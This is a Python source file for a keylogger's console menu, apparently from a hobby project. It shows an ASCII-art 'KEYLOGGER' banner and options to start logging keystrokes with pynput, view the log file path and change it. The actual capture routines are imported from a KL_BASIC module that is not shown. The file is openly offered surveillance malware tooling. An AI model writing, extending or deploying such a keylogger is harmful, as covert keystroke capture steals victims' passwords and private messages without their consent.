from KL_BASIC import start, on_release, show_path_to_log, set_log_file_path
from pynput.keyboard import Key, Listener 
import os

# Keylogger

logo = """
██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗    
██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗   
█████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝   
██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗   
██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║   
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝   
                                                                               
                 ██████╗██╗  ██╗██╗████████████╗██╗   ████████╗█████████████████████╗ 
                ██╔═████╚██╗██╔█████╔════██╔══██╚██╗ ██╔██╔══██╚══██╔══██╔════██╔══██╗
                ██║██╔██║╚███╔╝╚████║    ██████╔╝╚████╔╝██████╔╝  ██║  █████╗ ██████╔╝
    BY          ████╔╝██║██╔██╗ ████║    ██╔══██╗ ╚██╔╝ ██╔═══╝   ██║  ██╔══╝ ██╔══██╗
                ╚██████╔██╔╝ ██╗██╚████████║  ██║  ██║  ██║       ██║  █████████║  ██║
                 ╚═════╝╚═╝  ╚═╝╚═╝╚═════╚═╝  ╚═╝  ╚═╝  ╚═╝       ╚═╝  ╚══════╚═╝  ╚═╝   
"""

def main_menu():
    while True:
        os.system("title KeyLogger")
        os.system("cls")
        print(logo)
        print("[1] KeyLogger_Advanced")
        print("[2] Show Path to Log File")
        print("[3] Set Log File Path")
        print("[4] Exit")
        x = input("Options: ")

        if x == '1':
            print("Keylogger is now running...")
            global running
            running = True
            listener = Listener(on_release=on_release)
            start()  # Start the KL_BASIC process
            print("KeyLogger_Advanced has stopped running....")
            input("Press Enter to return to the main menu....")
        elif x == '2':
            show_path_to_log()
            input("Press Enter to return to the main menu....")
        elif x == '3':
            new_path = input("Enter new log file path: ")
            set_log_file_path(new_path)
            input("Press Enter to return to the main menu....")
        elif x == '4':
            print("Exiting...")
            break

if __name__ == "__main__":
    main_menu()
